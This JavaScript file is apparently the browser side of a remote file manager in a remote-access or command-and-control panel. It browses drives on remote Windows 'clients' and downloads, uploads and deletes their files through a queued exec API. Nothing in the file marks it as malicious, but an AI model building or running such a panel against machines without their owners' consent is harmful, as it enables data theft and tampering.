// language: JavaScript, file: public/js/files.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);
const clientId = Number(params.get('id'));
const hostName = params.get('host') || `client ${clientId}`;
const hostIp   = params.get('ip') || '';
$('target').textContent = `${hostName} @ ${hostIp}`;

let filePath = "C:\\";

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}

function humanSize(n) {
  if (!n) return '';
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  if (n < 1024 * 1024 * 1024) return `${(n / 1024 / 1024).toFixed(2)} MB`;
  return `${(n / 1024 / 1024 / 1024).toFixed(2)} GB`;
}

function setStatus(s) { $('status').textContent = s; }

function joinPath(base, name) {
  if (!base) return name;
  return base.endsWith('\\') ? base + name : base + '\\' + name;
}

function parentPath(p) {
  if (!p || p.length <= 3) return p;
  const trimmed = p.replace(/\\+$/, '');
  const idx = trimmed.lastIndexOf('\\');
  if (idx <= 1) return trimmed.slice(0, 3);
  return trimmed.slice(0, idx + 1);
}

async function runOp(action, path, extra = {}) {
  const payload = JSON.stringify({ action, path, ...extra });
  const r = await fetch(`/api/clients/${clientId}/exec`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ shell: 'file', line: payload }),
  });
  if (!r.ok) {
    const d = await r.json().catch(() => ({}));
    throw new Error(d.error || `http ${r.status}`);
  }
  const d = await r.json();
  if (d.error) throw new Error(d.error);

  const cmdId = d.commandId;
  for (let i = 0; i < 240; i++) {
    await new Promise(res => setTimeout(res, 500));
    try {
      const rows = await (await fetch(`/api/clients/${clientId}/commands`)).json();
      const c = rows.find(x => x.id === cmdId);
      if (c && c.status === 'done') return c.output || '';
    } catch {}
  }
  throw new Error('timeout — client did not respond');
}

// probe common drive letters on startup — the ones that respond get a button
async function loadDrives() {
  const container = $('drives');
  container.innerHTML = '';
  const candidates = ['C', 'D', 'E', 'F', 'G'];
  const found = [];

  for (const letter of candidates) {
    try {
      const raw = await Promise.race([
        runOp('list', letter + ':\\'),
        new Promise((_, rej) => setTimeout(() => rej(new Error('t')), 3000)),
      ]);
      if (raw.startsWith('b64:')) {
        found.push(letter + ':\\');
      }
    } catch {}
  }
  if (found.length === 0) found.push('C:\\');

  for (const d of found) {
    const b = document.createElement('button');
    b.textContent = d.replace('\\', '');
    b.dataset.drive = d;
    b.addEventListener('click', () => {
      filePath = d;
      loadList();
    });
    container.appendChild(b);
  }
  updateDriveActive();
}

function updateDriveActive() {
  document.querySelectorAll('#drives button').forEach(b => {
    b.classList.toggle('active', filePath.toUpperCase() === b.dataset.drive.toUpperCase());
  });
}

async function loadList() {
  const list = $('list');
  $('path').value = filePath;
  updateDriveActive();
  list.innerHTML = '<div class="fm-empty">loading…</div>';
  setStatus(`loading ${filePath}…`);

  try {
    const raw = await runOp('list', filePath);
    if (!raw || raw.startsWith('err:')) {
      list.innerHTML = `<div class="fm-err">${esc((raw || '').slice(4) || 'no response')}</div>`;
      setStatus('error');
      return;
    }
    if (!raw.startsWith('b64:')) {
      list.innerHTML = `<div class="fm-err">unexpected: ${esc(raw.slice(0, 200))}</div>`;
      setStatus('error');
      return;
    }
    const data = JSON.parse(atob(raw.slice(4)));
    if (!data.ok || !Array.isArray(data.items)) {
      list.innerHTML = '<div class="fm-err">bad payload</div>';
      setStatus('error');
      return;
    }

    data.items.sort((a, b) => {
      if (a.dir !== b.dir) return a.dir ? -1 : 1;
      return a.name.toLowerCase().localeCompare(b.name.toLowerCase());
    });

    list.innerHTML = '';
    const head = document.createElement('div');
    head.className = 'fm-head';
    head.innerHTML = `<span>name</span><span>size</span><span></span>`;
    list.appendChild(head);

    if (data.items.length === 0) {
      const e = document.createElement('div');
      e.className = 'fm-empty';
      e.textContent = 'folder is empty';
      list.appendChild(e);
      setStatus(`${filePath} — empty`);
      return;
    }

    for (const item of data.items) {
      const row = document.createElement('div');
      row.className = 'fm-row' + (item.dir ? ' dir' : '');
      const icon = item.dir
        ? '<svg viewBox="0 0 24 24"><path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/></svg>'
        : '<svg viewBox="0 0 24 24"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/></svg>';
      row.innerHTML = `
        <span class="nm">${icon}${esc(item.name)}</span>
        <span class="sz">${item.dir ? '&lt;DIR&gt;' : humanSize(item.size)}</span>
        <span class="ac"></span>`;
      const ac = row.querySelector('.ac');

      if (!item.dir) {
        const dl = document.createElement('button');
        dl.className = 'ghost mini';
        dl.textContent = '↓';
        dl.title = 'download';
        dl.addEventListener('click', async (e) => {
          e.stopPropagation();
          dl.disabled = true; dl.textContent = '…';
          setStatus(`downloading ${item.name}…`);
          try {
            const rawD = await runOp('download', joinPath(filePath, item.name));
            if (!rawD.startsWith('b64:')) throw new Error(rawD);
            const bin = atob(rawD.slice(4));
            const bytes = new Uint8Array(bin.length);
            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
            const blob = new Blob([bytes], { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = item.name;
            document.body.appendChild(a); a.click(); a.remove();
            setTimeout(() => URL.revokeObjectURL(url), 2000);
            dl.textContent = '✓';
            setStatus(`downloaded ${item.name}`);
          } catch (err) {
            dl.textContent = '!';
            setStatus(`download failed: ${err.message}`);
          } finally {
            setTimeout(() => { dl.textContent = '↓'; dl.disabled = false; }, 1000);
          }
        });
        ac.appendChild(dl);
      }

      const del = document.createElement('button');
      del.className = 'ghost mini';
      del.textContent = '✕';
      del.title = 'delete';
      del.style.cssText = 'border-color:rgba(248,113,113,.35);color:var(--red)';
      del.addEventListener('click', async (e) => {
        e.stopPropagation();
        if (!confirm(`delete ${item.name}?`)) return;
        del.disabled = true; del.textContent = '…';
        try {
          const out = await runOp('delete', joinPath(filePath, item.name));
          if (out === 'ok') { loadList(); setStatus(`deleted ${item.name}`); }
          else { del.textContent = '!'; setStatus(`delete failed: ${out}`); }
        } catch (err) {
          del.textContent = '!';
          setStatus(`delete failed: ${err.message}`);
        } finally {
          setTimeout(() => { del.textContent = '✕'; del.disabled = false; }, 1000);
        }
      });
      ac.appendChild(del);

      row.addEventListener('click', (e) => {
        if (e.target.closest('button')) return;
        if (item.dir) {
          filePath = joinPath(filePath, item.name);
          loadList();
        }
      });

      list.appendChild(row);
    }
    setStatus(`${filePath} — ${data.items.length} items`);
  } catch (err) {
    list.innerHTML = `<div class="fm-err">${esc(err.message)}</div>`;
    setStatus('error');
  }
}

$('up').addEventListener('click', () => {
  filePath = parentPath(filePath);
  loadList();
});

$('go').addEventListener('click', () => {
  filePath = $('path').value.trim() || 'C:\\';
  loadList();
});

$('path').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') { $('go').click(); }
});

$('refresh').addEventListener('click', () => loadList());

$('mkdir').addEventListener('click', async () => {
  const name = prompt('folder name:');
  if (!name) return;
  try {
    const out = await runOp('mkdir', joinPath(filePath, name));
    if (out === 'ok') { loadList(); setStatus(`created ${name}`); }
    else { setStatus(`mkdir failed: ${out}`); }
  } catch (err) {
    setStatus(`mkdir failed: ${err.message}`);
  }
});

$('upload').addEventListener('click', () => $('file-input').click());

$('file-input').addEventListener('change', async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  $('upload').disabled = true;
  $('upload').textContent = '↑ uploading…';
  setStatus(`uploading ${file.name}…`);
  try {
    const dataUrl = await new Promise((res, rej) => {
      const rd = new FileReader();
      rd.onload = () => res(rd.result);
      rd.onerror = rej;
      rd.readAsDataURL(file);
    });
    const b64 = String(dataUrl).split(',')[1] || '';
    const out = await runOp('upload', filePath, { name: file.name, data: b64 });
    if (out === 'ok') { loadList(); setStatus(`uploaded ${file.name}`); }
    else { setStatus(`upload failed: ${out}`); }
  } catch (err) {
    setStatus(`upload failed: ${err.message}`);
  } finally {
    $('upload').disabled = false;
    $('upload').textContent = '↑ upload';
    e.target.value = '';
  }
});

$('close').addEventListener('click', () => window.close());

loadDrives();
loadList();